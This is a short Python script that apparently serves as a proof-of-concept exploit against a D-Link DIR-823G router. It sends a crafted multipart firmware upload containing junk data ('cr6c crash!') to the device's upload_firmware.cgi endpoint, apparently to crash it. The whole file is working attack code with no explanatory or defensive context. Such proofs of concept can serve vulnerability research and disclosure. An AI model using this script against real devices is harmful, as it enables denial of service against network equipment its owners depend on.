import requests

url = "http://192.168.0.1/cgi-bin/upload_firmware.cgi"

headers = {
    "Host": "192.168.0.1",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------28278418346116865854153533320",
    "Origin": "http://192.168.0.1",
    "Referer": "http://192.168.0.1/FirmwareUpdate.html",
    "Upgrade-Insecure-Requests": "1",
}

payload = '''
-----------------------------28278418346116865854153533320
Content-Disposition: form-data; name="uploadConfigFile"; filename="DIR823G_V1.0.2B05_20181207.bin"
Content-Type: application/octet-stream

cr6c crash!
-----------------------------28278418346116865854153533320--
'''

response = requests.post(url, headers=headers, data=payload)
print(response.text)
